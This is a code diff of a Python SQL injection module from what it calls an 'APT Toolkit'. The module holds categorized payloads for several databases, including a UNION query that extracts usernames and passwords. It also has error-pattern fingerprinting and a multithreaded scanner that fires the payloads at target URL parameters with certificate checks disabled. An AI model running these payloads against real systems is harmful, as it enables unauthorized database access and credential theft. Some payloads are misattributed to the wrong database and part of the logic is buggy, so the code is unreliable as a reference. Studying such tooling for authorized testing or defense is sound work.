@@ -1,252 +1,478 @@
-"""
-SQL Injection Module for APT Toolkit
-
-Features:
-- SQL injection detection
-- Multiple attack techniques
-- Payload generation
-- Result analysis
-- Thread-safe operation
-"""
-
+# src/modules/web/sql_injector.py
+import re
 import time
 import random
 import threading
-from typing import Dict, List, Optional, Tuple, Any
-from concurrent.futures import ThreadPoolExecutor
+from typing import Dict, List, Optional, Tuple, Any, Union
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from enum import Enum, auto
 import requests
-from urllib.parse import urljoin
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
-from src.core.engine import ScanModule, ScanTarget, ScanResult, ScanStatus
+from src.core.scan_manager import ScanResult, ScanStatus, ScanTarget
 from src.utils.logger import get_logger
+from src.utils.validators import validate_url, sanitize_input
+from src.core.event_system import Event, event_system
 from src.utils.network import NetworkHelpers
 from src.utils.config import config
-from src.core.event_system import event_system, Event
-from src.utils.helpers import ErrorHelpers
 
-logger = get_logger(__name__)
+logger = get_logger(__name__, structured=True)
 
-class InjectionType(Enum):
-    """SQL injection types"""
-    BOOLEAN = auto()
-    TIME_BASED = auto()
-    ERROR_BASED = auto()
-    UNION = auto()
+class SQLInjectionType(Enum):
+    """Enumeration of SQL injection techniques with severity levels"""
+    ERROR_BASED = (auto(), "high")
+    BOOLEAN_BASED = (auto(), "medium")
+    TIME_BASED = (auto(), "medium")
+    UNION_BASED = (auto(), "high")
+    STACKED_QUERIES = (auto(), "critical")
 
-class SQLInjector(ScanModule):
-    """SQL injection testing module"""
+    def __init__(self, value, severity):
+        self._value_ = value
+        self.severity = severity
+
+class SQLInjectionResult:
+    """Detailed result container for SQL injection tests"""
     
     def __init__(self):
-        super().__init__()
-        self.module_name = "sql_injector"
-        self.timeout = config.web.request_timeout
-        self.max_threads = config.web.max_threads
-        self.payloads = self._load_payloads()
-        self._stop_event = threading.Event()
+        self.vulnerable = False
+        self.technique: Optional[SQLInjectionType] = None
+        self.payload: Optional[str] = None
+        self.evidence: Optional[str] = None
+        self.parameter: Optional[str] = None
+        self.response_time: Optional[float] = None
+        self.response_length: Optional[int] = None
+        self.response_code: Optional[int] = None
+        self.database_indicator: Optional[str] = None
         
-    def _load_payloads(self) -> Dict[InjectionType, List[str]]:
-        """Load SQL injection payloads"""
+    def to_dict(self) -> Dict[str, Any]:
         return {
-            InjectionType.BOOLEAN: [
-                "' OR 1=1 --",
-                "' OR 'a'='a",
-                "\" OR \"\"=\""
-            ],
-            InjectionType.TIME_BASED: [
-                "' OR (SELECT * FROM (SELECT(SLEEP(5)))abc) --",
-                "' OR IF(1=1,SLEEP(5),0) --"
-            ],
-            InjectionType.ERROR_BASED: [
-                "' AND GTID_SUBSET(CONCAT(0x7178787171,(SELECT (ELT(1=1,1))),0x7178787171),1) --",
+            "vulnerable": self.vulnerable,
+            "technique": self.technique.name if self.technique else None,
+            "severity": self.technique.severity if self.technique else None,
+            "payload": self.payload,
+            "evidence": self.evidence,
+            "parameter": self.parameter,
+            "response_time": self.response_time,
+            "response_length": self.response_length,
+            "response_code": self.response_code,
+            "database_indicator": self.database_indicator
+        }
+
+class SQLInjector:
+    """Advanced SQL injection detection module with multiple techniques"""
+    
+    # Payloads categorized by technique and database fingerprint
+    PAYLOADS = {
+        SQLInjectionType.ERROR_BASED: {
+            "generic": ["'", "\"", "' OR 1=1 --", "\" OR \"\"=\""],
+            "mysql": [
+                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1=1,1))),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
                 "' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT @@version),0x3a)) --"
             ],
-            InjectionType.UNION: [
+            "mssql": ["' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --"],
+            "oracle": ["' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --"]
+        },
+        SQLInjectionType.BOOLEAN_BASED: {
+            "generic": [
+                "' OR 1=1 --",
+                "' AND 1=0 --",
+                "' OR 'a'='a' --",
+                "' OR ''='"
+            ],
+            "mysql": ["' OR BINARY_CHECKSUM(1)=1 --"],
+            "mssql": ["' OR @@PACK_RECEIVED=@@PACK_SENT --"],
+            "oracle": ["' OR (SELECT NVL(RAWTOHEX(DBMS_CRYPTO.HASH(UTL_RAW.CAST_TO_RAW('test'),2),'0') FROM dual)='0' --"]
+        },
+        SQLInjectionType.TIME_BASED: {
+            "generic": [
+                "' OR (SELECT COUNT(*) FROM information_schema.tables) > 0; WAITFOR DELAY '0:0:5' --",
+                "' OR IF(1=1,SLEEP(5),0) --"
+            ],
+            "mysql": ["' OR (SELECT * FROM (SELECT(SLEEP(5)))a) --"],
+            "mssql": ["'; WAITFOR DELAY '0:0:5' --"],
+            "oracle": ["' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5) IS NULL --"],
+            "postgresql": ["' OR (SELECT pg_sleep(5)) --"]
+        },
+        SQLInjectionType.UNION_BASED: {
+            "generic": [
                 "' UNION SELECT null,CONCAT(username,0x3a,password) FROM users --",
                 "' UNION SELECT null,table_name FROM information_schema.tables --"
             ]
         }
+    }
+    
+    # Database error patterns for fingerprinting
+    DB_ERROR_PATTERNS = {
+        "mysql": [
+            r"SQL syntax.*MySQL",
+            r"Warning.*mysql_.*",
+            r"MySqlClient\."
+        ],
+        "mssql": [
+            r"Microsoft SQL Server",
+            r"ODBC Driver",
+            r"SQL Server.*Driver",
+            r"System.Data.SqlClient"
+        ],
+        "oracle": [
+            r"ORA-[0-9]{5}",
+            r"Oracle error",
+            r"Oracle.*Driver",
+            r"Warning.*oci_.*"
+        ],
+        "postgresql": [
+            r"PostgreSQL.*ERROR",
+            r"Warning.*pg_.*",
+            r"PSQLException"
+        ]
+    }
+    
+    TIME_THRESHOLD = 3  # Seconds to consider time-based injection
+    DEFAULT_TIMEOUT = 10
+    DEFAULT_THREADS = 5
+
+    def __init__(
+        self,
+        target: Union[str, ScanTarget],
+        method: str = "GET",
+        headers: Optional[Dict[str, str]] = None,
+        data: Optional[Dict[str, str]] = None,
+        timeout: int = DEFAULT_TIMEOUT,
+        thread_count: int = DEFAULT_THREADS
+    ):
+        """
+        Initialize SQL injection scanner
         
-    def initialize(self) -> None:
-        """Initialize injector resources"""
-        logger.info(f"Initialized {self.module_name} with {self.max_threads} threads")
+        Args:
+            target: Target URL or ScanTarget object
+            method: HTTP method (GET/POST)
+            headers: Optional HTTP headers
+            data: Optional POST data
+            timeout: Request timeout in seconds
+            thread_count: Number of threads for parallel testing
+        """
+        if isinstance(target, ScanTarget):
+            self.target = target
+            self.url = target.host
+        else:
+            self.url = target
+            self.target = ScanTarget(host=target)
+            
+        if not validate_url(self.url):
+            raise ValueError(f"Invalid URL provided: {self.url}")
+            
+        self.method = method.upper()
+        self.headers = headers or {}
+        self.original_data = data or {}
+        self.timeout = timeout
+        self.thread_count = thread_count
+        self.session = requests.Session()
+        self.session.headers.update(self.headers)
+        self._stop_event = threading.Event()
         
-    def cleanup(self) -> None:
-        """Cleanup injector resources"""
+        # Parse URL components
+        self.parsed_url = urlparse(self.url)
+        self.base_url = urlunparse(self.parsed_url._replace(query=None, fragment=None))
+        self.query_params = parse_qs(self.parsed_url.query, keep_blank_values=True)
+        
+        logger.info(
+            "SQLInjector initialized",
+            extra={
+                "data": {
+                    "target": self.url,
+                    "method": self.method,
+                    "parameters": list(self.query_params.keys()) if self.method == "GET" else list(self.original_data.keys()),
+                    "timeout": self.timeout,
+                    "threads": self.thread_count
+                }
+            }
+        )
+
+    def stop(self) -> None:
+        """Stop active scanning"""
         self._stop_event.set()
-        logger.info(f"Cleaned up {self.module_name}")
-        
-    def validate_target(self, target: ScanTarget) -> bool:
-        """Validate target is appropriate for SQL injection testing"""
-        if not target.host:
-            return False
-        return target.host.startswith(('http://', 'https://'))
-        
-    def _test_injection(self, url: str, params: Dict[str, str], payload: str, injection_type: InjectionType) -> Tuple[bool, Dict[str, Any]]:
-        """Test a single injection payload"""
-        result = {
-            "vulnerable": False,
-            "type": injection_type.name,
-            "payload": payload,
-            "response_time": 0,
-            "response_code": 0,
-            "response_length": 0,
-            "errors": []
-        }
+        logger.info("SQL injection scan stopped by request")
+
+    def _send_request(
+        self,
+        params: Optional[Dict[str, str]] = None,
+        data: Optional[Dict[str, str]] = None,
+        timeout: Optional[int] = None
+    ) -> requests.Response:
+        """Send HTTP request with error handling"""
+        timeout = timeout or self.timeout
         
         try:
-            # Prepare test data
-            test_params = params.copy()
-            for k in test_params:
-                test_params[k] += payload
-                
-            start_time = time.time()
-            response = requests.get(
-                url,
-                params=test_params,
-                timeout=self.timeout,
-                allow_redirects=False,
-                verify=False
-            )
-            elapsed = time.time() - start_time
-            
-            result.update({
-                "response_time": elapsed,
-                "response_code": response.status_code,
-                "response_length": len(response.content)
-            })
-            
-            # Detection logic based on injection type
-            if injection_type == InjectionType.TIME_BASED:
-                result["vulnerable"] = elapsed >= 5
-            elif injection_type == InjectionType.ERROR_BASED:
-                result["vulnerable"] = "SQL syntax" in response.text
-            else:  # BOOLEAN and UNION
-                original_response = requests.get(
-                    url,
+            if self.method == "GET":
+                return self.session.get(
+                    self.base_url,
                     params=params,
-                    timeout=self.timeout,
+                    timeout=timeout,
                     allow_redirects=False,
                     verify=False
                 )
-                result["vulnerable"] = (
-                    response.status_code != original_response.status_code or
-                    response.text != original_response.text
+            else:
+                return self.session.post(
+                    self.base_url,
+                    data=data,
+                    timeout=timeout,
+                    allow_redirects=False,
+                    verify=False
                 )
-                
         except requests.exceptions.RequestException as e:
-            result["errors"].append(str(e))
+            logger.warning(
+                "Request failed during SQL injection test",
+                extra={"data": {"url": self.url, "error": str(e)}}
+            )
+            raise
+
+    def _get_baseline_response(self, param: str) -> Optional[requests.Response]:
+        """Get baseline response for comparison"""
+        try:
+            if self.method == "GET":
+                baseline_params = self.query_params.copy()
+                baseline_params[param] = ["1"]  # Safe value for baseline
+                return self._send_request(params=baseline_params)
+            else:
+                baseline_data = self.original_data.copy()
+                baseline_data[param] = "1"
+                return self._send_request(data=baseline_data)
         except Exception as e:
-            logger.error(f"Injection test failed: {str(e)}")
-            result["errors"].append(str(e))
+            logger.warning(
+                "Failed to get baseline response",
+                extra={"data": {"parameter": param, "error": str(e)}}
+            )
+            return None
+
+    def _detect_database(self, response_text: str) -> Optional[str]:
+        """Attempt to identify database from error messages"""
+        for db_type, patterns in self.DB_ERROR_PATTERNS.items():
+            for pattern in patterns:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return db_type
+        return None
+
+    def _test_payload(
+        self,
+        param: str,
+        payload: str,
+        technique: SQLInjectionType
+    ) -> Optional[SQLInjectionResult]:
+        """Test a single payload against a parameter"""
+        if self._stop_event.is_set():
+            return None
             
-        return result["vulnerable"], result
+        result = SQLInjectionResult()
+        result.parameter = param
+        result.payload = payload
+        result.technique = technique
         
-    def _scan_endpoint(self, url: str, params: Dict[str, str]) -> List[Dict[str, Any]]:
-        """Scan a single endpoint for SQL injection vulnerabilities"""
+        try:
+            # Prepare test data
+            test_params = None
+            test_data = None
+            
+            if self.method == "GET":
+                test_params = self.query_params.copy()
+                test_params[param] = [payload]
+                request_params = {k: v[0] if len(v) == 1 else v for k, v in test_params.items()}
+            else:
+                test_data = self.original_data.copy()
+                test_data[param] = payload
+            
+            # Send request and measure time
+            start_time = time.time()
+            
+            if self.method == "GET":
+                response = self._send_request(params=request_params)
+            else:
+                response = self._send_request(data=test_data)
+                
+            response_time = time.time() - start_time
+            result.response_time = response_time
+            result.response_code = response.status_code
+            result.response_length = len(response.content)
+            
+            # Database fingerprinting
+            db_type = self._detect_database(response.text)
+            if db_type:
+                result.database_indicator = db_type
+            
+            # Technique-specific detection logic
+            if technique == SQLInjectionType.ERROR_BASED:
+                if db_type or any(
+                    re.search(pattern, response.text, re.IGNORECASE)
+                    for patterns in self.DB_ERROR_PATTERNS.values()
+                    for pattern in patterns
+                ):
+                    result.vulnerable = True
+                    result.evidence = "Database error in response"
+                    return result
+                    
+            elif technique == SQLInjectionType.BOOLEAN_BASED:
+                baseline = self._get_baseline_response(param)
+                if baseline and (response.text != baseline.text or response.status_code != baseline.status_code):
+                    result.vulnerable = True
+                    result.evidence = "Different response for boolean condition"
+                    return result
+                    
+            elif technique == SQLInjectionType.TIME_BASED:
+                if response_time >= self.TIME_THRESHOLD:
+                    result.vulnerable = True
+                    result.evidence = f"Delayed response ({response_time:.2f}s)"
+                    return result
+                    
+            elif technique == SQLInjectionType.UNION_BASED:
+                baseline = self._get_baseline_response(param)
+                if baseline and (len(response.content) > len(baseline.content) + 100 and 
+                    any(keyword in response.text.lower() for keyword in ["user", "password", "table", "column"])):
+                    result.vulnerable = True
+                    result.evidence = "Union-based injection response detected"
+                    return result
+                    
+        except Exception as e:
+            logger.debug(
+                "Payload test failed",
+                extra={
+                    "data": {
+                        "parameter": param,
+                        "payload": payload,
+                        "technique": technique.name,
+                        "error": str(e)
+                    }
+                }
+            )
+        
+        return None
+
+    def _test_parameter(
+        self,
+        param: str,
+        techniques: List[SQLInjectionType] = None
+    ) -> List[SQLInjectionResult]:
+        """Test all payloads against a single parameter"""
+        if self._stop_event.is_set():
+            return []
+            
+        techniques = techniques or list(SQLInjectionType)
         results = []
         
-        for injection_type, payloads in self.payloads.items():
+        for technique in techniques:
             if self._stop_event.is_set():
                 break
                 
-            for payload in payloads:
+            payloads = self.PAYLOADS.get(technique, {}).get("generic", [])
+            db_specific_payloads = []
+            
+            # If we have database info, try specific payloads
+            if hasattr(self, 'database_indicator'):
+                db_specific_payloads = self.PAYLOADS.get(technique, {}).get(self.database_indicator, [])
+                
+            for payload in payloads + db_specific_payloads:
                 if self._stop_event.is_set():
                     break
                     
-                vulnerable, result = self._test_injection(url, params, payload, injection_type)
-                results.append(result)
-                
-                if vulnerable:
-                    logger.info(f"Found SQLi vulnerability at {url} with payload: {payload}")
-                    return results  # Early exit if vulnerability found
-                    
+                result = self._test_payload(param, payload, technique)
+                if result:
+                    results.append(result)
+                    if result.vulnerable:
+                        # If we find a vulnerability, update database info if available
+                        if result.database_indicator and not hasattr(self, 'database_indicator'):
+                            self.database_indicator = result.database_indicator
+                        return results  # Early exit if vulnerability found
+                        
         return results
-        
-    def execute(self, target: ScanTarget) -> ScanResult:
+
+    def scan(
+        self,
+        params: Optional[List[str]] = None,
+        techniques: Optional[List[SQLInjectionType]] = None
+    ) -> ScanResult:
         """
-        Execute SQL injection testing against target
+        Perform comprehensive SQL injection scan
         
         Args:
-            target: ScanTarget specifying URL and parameters
+            params: Specific parameters to test (None for all)
+            techniques: Specific techniques to try (None for all)
             
         Returns:
-            ScanResult with injection test results
+            ScanResult with vulnerability information
         """
-        if not self.validate_target(target):
-            logger.error(f"Invalid scan target: {target.host}")
-            return ScanResult(
-                target=target,
-                data={"error": "Invalid target"},
-                status=ScanStatus.FAILED
-            )
-            
-        url = target.host
-        params = target.metadata.get("params", {})
-        
-        logger.info(f"Starting SQL injection testing on {url}")
+        scan_result = ScanResult(
+            module="SQLInjector",
+            target=self.target,
+            status=ScanStatus.RUNNING
+        )
         
         try:
-            results = []
-            vulnerable = False
+            test_params = params or (
+                list(self.query_params.keys()) if self.method == "GET" 
+                else list(self.original_data.keys())
+            )
             
-            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
-                futures = []
+            if not test_params:
+                logger.warning("No parameters available for testing")
+                scan_result.status = ScanStatus.COMPLETED
+                return scan_result
                 
-                # Test URL parameters
-                for param in params:
-                    if self._stop_event.is_set():
-                        break
-                        
-                    test_params = {k: "" for k in params}
-                    test_params[param] = params[param]
-                    futures.append(executor.submit(self._scan_endpoint, url, test_params))
-                    
-                # Process results
-                for future in futures:
-                    if self._stop_event.is_set():
-                        break
-                        
-                    try:
-                        endpoint_results = future.result()
-                        results.extend(endpoint_results)
-                        if any(r["vulnerable"] for r in endpoint_results):
-                            vulnerable = True
-                            break  # Stop if vulnerability found
-                    except Exception as e:
-                        logger.error(f"SQLi test failed: {str(e)}")
-                        
-            return ScanResult(
-                target=target,
-                data={
-                    "vulnerable": vulnerable,
-                    "results": results,
-                    "stats": {
-                        "tests_performed": len(results),
-                        "vulnerable_params": len([r for r in results if r["vulnerable"]]),
-                        "types_tested": list(set(r["type"] for r in results))
-                    }
-                },
-                status=ScanStatus.COMPLETED
-            )
+            vulnerabilities = []
             
+            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
+                futures = {
+                    executor.submit(self._test_parameter, param, techniques): param
+                    for param in test_params
+                }
+                
+                for future in as_completed(futures):
+                    if self._stop_event.is_set():
+                        break
+                        
+                    param_results = future.result()
+                    for result in param_results:
+                        if result.vulnerable:
+                            vulnerabilities.append(result.to_dict())
+                            event_system.emit(
+                                "vulnerability_found",
+                                {
+                                    "type": "sql_injection",
+                                    "severity": result.technique.severity,
+                                    "details": result.to_dict()
+                                }
+                            )
+                            
+            if vulnerabilities:
+                scan_result.status = ScanStatus.VULNERABLE
+                scan_result.data = {
+                    "vulnerabilities": vulnerabilities,
+                    "summary": {
+                        "total": len(vulnerabilities),
+                        "by_technique": {
+                            tech.name: len([v for v in vulnerabilities if v["technique"] == tech.name])
+                            for tech in SQLInjectionType
+                        },
+                        "by_parameter": {
+                            param: len([v for v in vulnerabilities if v["parameter"] == param])
+                            for param in test_params
+                        }
+                    }
+                }
+            else:
+                scan_result.status = ScanStatus.COMPLETED
+                scan_result.data = {"message": "No SQL injection vulnerabilities found"}
+                
         except Exception as e:
-            logger.error(f"SQL injection testing failed on {target.host}: {str(e)}", exc_info=True)
-            return ScanResult(
-                target=target,
-                data={"error": str(e)},
-                status=ScanStatus.FAILED
+            logger.error(
+                "SQL injection scan failed",
+                extra={"data": {"error": str(e), "url": self.url}},
+                exc_info=True
             )
-
-# Module registration
-def init_module():
-    return SQLInjector()
+            scan_result.status = ScanStatus.FAILED
+            scan_result.data = {"error": str(e)}
+            
+        return scan_result
 
 # Example usage:
-# injector = SQLInjector()
-# target = ScanTarget(
-#     host="http://example.com/login.php",
-#     metadata={"params": {"username": "test", "password": "test"}}
-# )
-# result = injector.execute(target)
-# print(json.dumps(result.data, indent=2))
+# target = ScanTarget(host="http://example.com/login.php")
+# injector = SQLInjector(target)
+# result = injector.scan()
+# print(result.to_json())
